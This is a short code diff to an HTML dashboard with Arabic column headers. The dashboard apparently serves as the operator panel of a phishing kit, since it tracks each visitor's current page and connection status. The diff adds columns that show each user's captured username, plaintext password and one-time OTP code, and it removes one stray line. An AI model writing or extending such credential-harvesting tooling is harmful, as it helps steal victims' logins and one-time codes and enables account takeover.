@@ -316,9 +316,12 @@ style="background:linear-gradient(135deg,#dc2626,#ef4444)">
 
             <thead>
 
-              <tr>
+<tr>
     <th>الاسم</th>
     <th>الرقم</th>
+    <th>اسم المستخدم</th>
+    <th>كلمة المرور</th>
+    <th>OTP</th>
     <th>الحالة</th>
     <th>الصفحة الحالية</th>
     <th>الاتصال</th>
@@ -502,6 +505,12 @@ users.forEach((user)=>{
         <td>${user.name || '-'}</td>
 
         <td>${user.phone || '-'}</td>
+
+        <td>${user.username || '-'}</td>
+
+<td>${user.password || '-'}</td>
+
+<td>${user.otp || '-'}</td>
 
         <td>
             <div class="status">
@@ -710,7 +719,6 @@ deleteAllBtn.onclick = async ()=>{
 
 };
 
-Date.now() - (user.lastSeen || 0) < 15000;
 
 </script>
 
